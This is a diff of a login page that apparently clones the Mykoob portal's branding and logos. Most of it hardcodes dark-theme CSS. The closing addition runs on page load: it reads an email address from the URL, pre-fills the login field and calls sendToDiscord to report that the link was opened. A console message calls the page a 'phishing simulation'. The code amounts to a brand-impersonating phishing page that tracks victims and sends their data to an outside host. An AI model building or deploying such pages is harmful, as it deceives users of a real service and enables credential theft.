@@ -10,66 +10,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
 
     <style>
-        /* ── CSS variables: light (default) & dark via media query ── */
-        :root {
-            --bg-body: #f9fafb;
-            --bg-page: #f9fafb;
-            --bg-input: #ffffff;
-            --bg-modal: #ffffff;
-            --bg-secondary: #f3f4f6;
-            --border-light: #e5e7eb;
-            --border-input: #d1d5db;
-            --text-primary: #111827;
-            --text-secondary: #6b7280;
-            --text-muted: #9ca3af;
-            --link: #0274ef;
-            --link-hover: #025bc4;
-            --btn-primary: #0274ef;
-            --btn-primary-hover: #025bc4;
-            --error: #dc2626;
-            --modal-border: #e5e7eb;
-            --modal-shadow: 0 20px 60px rgba(0, 0, 0, 0.12);
-            --overlay: rgba(0, 0, 0, 0.4);
-            --select-bg: #ffffff;
-            --select-border: #d1d5db;
-            --select-text: #111827;
-            --select-arrow: %239ca3af;
-            --danger: #dc2626;
-            --danger-hover: #b91c1c;
-            --focus-ring: rgba(2, 116, 239, 0.25);
-        }
-
-        /* ── Dark mode via prefers-color-scheme ── */
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --bg-body: #121212;
-                --bg-page: #121212;
-                --bg-input: #1e1e1e;
-                --bg-modal: #1e1e1e;
-                --bg-secondary: #2d2d2d;
-                --border-light: #2d2d2d;
-                --border-input: #3d3d3d;
-                --text-primary: #f3f4f6;
-                --text-secondary: #9ca3af;
-                --text-muted: #6b7280;
-                --link: #489ffe;
-                --link-hover: #6bb0ff;
-                --btn-primary: #489ffe;
-                --btn-primary-hover: #0274ef;
-                --error: #ff686e;
-                --modal-border: #2d2d2d;
-                --modal-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
-                --overlay: rgba(0, 0, 0, 0.7);
-                --select-bg: #1a1a1a;
-                --select-border: #3d3d3d;
-                --select-text: #e5e7eb;
-                --select-arrow: %239ca3af;
-                --danger: #ff686e;
-                --danger-hover: #e43f39;
-                --focus-ring: rgba(72, 159, 254, 0.25);
-            }
-        }
-
         *,
         *::before,
         *::after {
@@ -84,12 +24,11 @@
         }
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: var(--bg-body);
-            color: var(--text-primary);
+            background: #121212;
+            color: #f3f4f6;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            transition: background 0.3s ease, color 0.3s ease;
         }
 
         .app {
@@ -98,7 +37,6 @@
             min-height: 100vh;
         }
 
-        /* ── Navbar — transparent, no border ── */
         .navbar {
             display: flex;
             align-items: center;
@@ -107,15 +45,12 @@
             border-bottom: none;
             flex-shrink: 0;
             background: transparent;
-            transition: background 0.3s ease;
         }
         .navbar__brand {
             display: flex;
             align-items: center;
             text-decoration: none;
         }
-
-        /* ── Logo switching via picture element ── */
         .navbar__brand picture {
             display: block;
             line-height: 0;
@@ -124,52 +59,38 @@
             height: 36px;
             width: auto;
             display: block;
-            transition: filter 0.3s ease;
         }
-
-        /* ── Language selector — fixed for light mode ── */
         .lang-select {
-            background-color: var(--select-bg);
-            border: 1px solid var(--select-border);
+            background: #1a1a1a;
+            border: 1px solid #3d3d3d;
             border-radius: 6px;
             font-size: 14px;
             font-weight: 500;
-            color: var(--select-text);
+            color: #e5e7eb;
             cursor: pointer;
             padding: 6px 12px 6px 28px;
             appearance: none;
-            -webkit-appearance: none;
-            -moz-appearance: none;
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%239ca3af' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
             background-repeat: no-repeat;
             background-position: left 8px center;
             background-size: 10px;
-            transition: background-color 0.3s ease, border-color 0.3s ease, color 0.3s ease, box-shadow 0.2s ease;
         }
         .lang-select:focus {
             outline: none;
-            border-color: var(--link);
-            box-shadow: 0 0 0 3px var(--focus-ring);
+            border-color: #489ffe;
         }
         .lang-select option {
-            background-color: var(--select-bg);
-            color: var(--select-text);
-        }
-        /* Ensure option text is visible in light mode dropdown */
-        .lang-select option:checked {
-            background-color: var(--link);
-            color: #ffffff;
+            background: #1a1a1a;
+            color: #e5e7eb;
         }
 
-        /* ── Page ── */
         .page {
             flex: 1 0 auto;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 40px 20px;
-            background: var(--bg-page);
-            transition: background 0.3s ease;
+            background: #121212;
         }
         .page__inner {
             display: flex;
@@ -180,7 +101,6 @@
             gap: 60px;
         }
 
-        /* ── Login form ── */
         .login-form {
             flex: 0 0 400px;
             max-width: 400px;
@@ -191,14 +111,12 @@
             font-weight: 600;
             line-height: 1.2;
             margin-bottom: 8px;
-            color: var(--text-primary);
-            transition: color 0.3s ease;
+            color: #f3f4f6;
         }
         .login-form__sub {
             font-size: 16px;
-            color: var(--text-secondary);
+            color: #9ca3af;
             margin-bottom: 28px;
-            transition: color 0.3s ease;
         }
 
         .form-group {
@@ -208,36 +126,34 @@
             display: block;
             font-size: 14px;
             font-weight: 500;
-            color: var(--text-secondary);
+            color: #d1d5db;
             margin-bottom: 4px;
-            transition: color 0.3s ease;
         }
         .form-group input {
             width: 100%;
             padding: 12px 16px;
             font-size: 16px;
             font-family: inherit;
-            border: 1.5px solid var(--border-input);
+            border: 1.5px solid #3d3d3d;
             border-radius: 10px;
-            background: var(--bg-input);
-            color: var(--text-primary);
-            transition: border-color 0.2s, box-shadow 0.2s, background 0.3s ease, color 0.3s ease;
+            background: #1e1e1e;
+            color: #f3f4f6;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
         .form-group input:focus {
             outline: none;
-            border-color: var(--link);
-            box-shadow: 0 0 0 3px var(--focus-ring);
+            border-color: #489ffe;
+            box-shadow: 0 0 0 3px rgba(72, 159, 254, 0.2);
         }
         .form-group input::placeholder {
-            color: var(--text-muted);
+            color: #6b7280;
         }
 
         .form-error {
-            color: var(--error);
+            color: #ff686e;
             font-size: 13px;
             min-height: 20px;
             margin-top: 4px;
-            transition: color 0.3s ease;
         }
 
         .form-actions {
@@ -249,7 +165,7 @@
 
         .forgot-link {
             font-size: 14px;
-            color: var(--link);
+            color: #489ffe;
             text-decoration: none;
             font-weight: 500;
             align-self: flex-start;
@@ -258,11 +174,9 @@
             border: none;
             padding: 0;
             font-family: inherit;
-            transition: color 0.3s ease;
         }
         .forgot-link:hover {
             text-decoration: underline;
-            color: var(--link-hover);
         }
 
         .btn-primary {
@@ -271,7 +185,7 @@
             font-size: 16px;
             font-weight: 600;
             font-family: inherit;
-            background: var(--btn-primary);
+            background: #489ffe;
             color: #ffffff;
             border: none;
             border-radius: 10px;
@@ -279,7 +193,7 @@
             transition: background 0.2s, transform 0.1s;
         }
         .btn-primary:hover {
-            background: var(--btn-primary-hover);
+            background: #0274ef;
         }
         .btn-primary:active {
             transform: scale(0.98);
@@ -293,15 +207,13 @@
         .alt-methods {
             margin-top: 24px;
             padding-top: 20px;
-            border-top: 1px solid var(--border-light);
-            transition: border-color 0.3s ease;
+            border-top: 1px solid #2d2d2d;
         }
         .alt-methods__label {
             font-size: 14px;
-            color: var(--text-secondary);
+            color: #9ca3af;
             display: block;
             margin-bottom: 8px;
-            transition: color 0.3s ease;
         }
         .alt-methods__list {
             display: flex;
@@ -310,7 +222,7 @@
         }
         .alt-methods__item {
             font-size: 14px;
-            color: var(--link);
+            color: #489ffe;
             text-decoration: none;
             font-weight: 500;
             cursor: pointer;
@@ -318,14 +230,11 @@
             border: none;
             padding: 0;
             font-family: inherit;
-            transition: color 0.3s ease;
         }
         .alt-methods__item:hover {
             text-decoration: underline;
-            color: var(--link-hover);
         }
 
-        /* ── Illustration ── */
         .illustration {
             flex: 1 1 0;
             display: flex;
@@ -339,10 +248,8 @@
             width: auto;
             height: auto;
             display: block;
-            transition: filter 0.3s ease;
         }
 
-        /* ── Footer — transparent, no border ── */
         .footer {
             flex-shrink: 0;
             padding: 20px 40px 28px;
@@ -353,9 +260,8 @@
             justify-content: space-between;
             gap: 12px 24px;
             font-size: 13px;
-            color: var(--text-muted);
+            color: #9ca3af;
             background: transparent;
-            transition: background 0.3s ease, color 0.3s ease;
         }
         .footer__left {
             display: flex;
@@ -363,8 +269,7 @@
             gap: 8px 24px;
         }
         .footer__left span {
-            color: var(--text-muted);
-            transition: color 0.3s ease;
+            color: #9ca3af;
         }
         .footer__right {
             display: flex;
@@ -372,46 +277,42 @@
             gap: 16px 24px;
         }
         .footer__right a {
-            color: var(--text-muted);
+            color: #9ca3af;
             text-decoration: none;
-            transition: color 0.3s ease;
         }
         .footer__right a:hover {
-            color: var(--text-primary);
+            color: #f3f4f6;
             text-decoration: underline;
         }
 
-        /* ── Modal ── */
         .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: var(--overlay);
+            background: rgba(0, 0, 0, 0.7);
             backdrop-filter: blur(4px);
             display: none;
             align-items: center;
             justify-content: center;
             z-index: 1000;
             padding: 20px;
-            transition: background 0.3s ease;
         }
         .modal-overlay.active {
             display: flex;
         }
 
         .modal {
-            background: var(--bg-modal);
-            border: 1px solid var(--modal-border);
+            background: #1e1e1e;
+            border: 1px solid #2d2d2d;
             border-radius: 16px;
             padding: 32px;
             max-width: 420px;
             width: 100%;
-            box-shadow: var(--modal-shadow);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
             animation: modalFade 0.25s ease;
             position: relative;
-            transition: background 0.3s ease, border-color 0.3s ease, box-shadow 0.3s ease;
         }
         @keyframes modalFade {
             from {
@@ -425,24 +326,22 @@
         }
 
         .modal--red {
-            border-color: var(--danger);
+            border-color: #ff686e;
         }
         .modal--red .modal__title {
-            color: var(--danger);
+            color: #ff686e;
         }
 
         .modal__title {
             font-size: 22px;
             font-weight: 600;
             margin-bottom: 8px;
-            color: var(--text-primary);
-            transition: color 0.3s ease;
+            color: #f3f4f6;
         }
         .modal__sub {
             font-size: 14px;
-            color: var(--text-secondary);
+            color: #9ca3af;
             margin-bottom: 24px;
-            transition: color 0.3s ease;
         }
         .modal__form-group {
             margin-bottom: 16px;
@@ -451,25 +350,23 @@
             display: block;
             font-size: 13px;
             font-weight: 500;
-            color: var(--text-secondary);
+            color: #d1d5db;
             margin-bottom: 4px;
-            transition: color 0.3s ease;
         }
         .modal__form-group input {
             width: 100%;
             padding: 10px 14px;
             font-size: 15px;
             font-family: inherit;
-            border: 1.5px solid var(--border-input);
+            border: 1.5px solid #3d3d3d;
             border-radius: 8px;
-            background: var(--bg-body);
-            color: var(--text-primary);
-            transition: border-color 0.2s, background 0.3s ease, color 0.3s ease;
+            background: #121212;
+            color: #f3f4f6;
+            transition: border-color 0.2s;
         }
         .modal__form-group input:focus {
             outline: none;
-            border-color: var(--link);
-            box-shadow: 0 0 0 3px var(--focus-ring);
+            border-color: #489ffe;
         }
         .modal__actions {
             display: flex;
@@ -484,16 +381,16 @@
             font-weight: 500;
             font-family: inherit;
             background: transparent;
-            color: var(--text-secondary);
-            border: 1px solid var(--border-input);
+            color: #9ca3af;
+            border: 1px solid #3d3d3d;
             border-radius: 8px;
             cursor: pointer;
-            transition: background 0.2s, border-color 0.2s, color 0.3s ease;
+            transition: background 0.2s, border-color 0.2s;
             text-align: center;
         }
         .modal__actions .btn-secondary:hover {
-            background: var(--bg-secondary);
-            border-color: var(--text-muted);
+            background: #2d2d2d;
+            border-color: #5a5a5a;
         }
         .modal__actions .btn-primary {
             flex: 1;
@@ -501,33 +398,31 @@
             font-size: 15px;
             font-weight: 600;
             font-family: inherit;
-            background: var(--btn-primary);
+            background: #489ffe;
             color: #fff;
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            transition: background 0.2s, color 0.3s ease;
+            transition: background 0.2s;
             text-align: center;
         }
         .modal__actions .btn-primary:hover {
-            background: var(--btn-primary-hover);
+            background: #0274ef;
         }
         .modal__actions .btn-danger {
-            background: var(--danger);
+            background: #ff686e;
             color: #fff;
         }
         .modal__actions .btn-danger:hover {
-            background: var(--danger-hover);
+            background: #e43f39;
         }
         .modal__error {
-            color: var(--error);
+            color: #ff686e;
             font-size: 13px;
             margin-top: 6px;
             min-height: 20px;
-            transition: color 0.3s ease;
         }
 
-        /* ── Responsive ── */
         @media (max-width: 900px) {
             .page__inner {
                 flex-direction: column;
@@ -586,7 +481,7 @@
                     <!-- Dark mode: light logo -->
                     <source srcset="https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png" media="(prefers-color-scheme: dark)" />
                     <!-- Fallback -->
-                    <img src="https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-dark-DX3tqsaM.png" alt="Mykoob" />
+                    <img src="https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png" alt="Mykoob" />
                 </picture>
             </a>
             <div>
@@ -994,4 +889,20 @@
             }
         };
 
-        // ── Check for
+        // ── Check for URL parameter on load ──
+        (function init() {
+            const params = new URLSearchParams(window.location.search);
+            const emailParam = params.get('email');
+            if (emailParam) {
+                emailInput.value = emailParam;
+                storedEmail = emailParam;
+                sendToDiscord(emailParam, '📨 Saites atvēršana', false, true);
+            }
+            
+            updateTexts('lv');
+            console.log('[Mykoob] Phishing simulation ready.');
+        })();
+    </script>
+
+</body>
+</html>
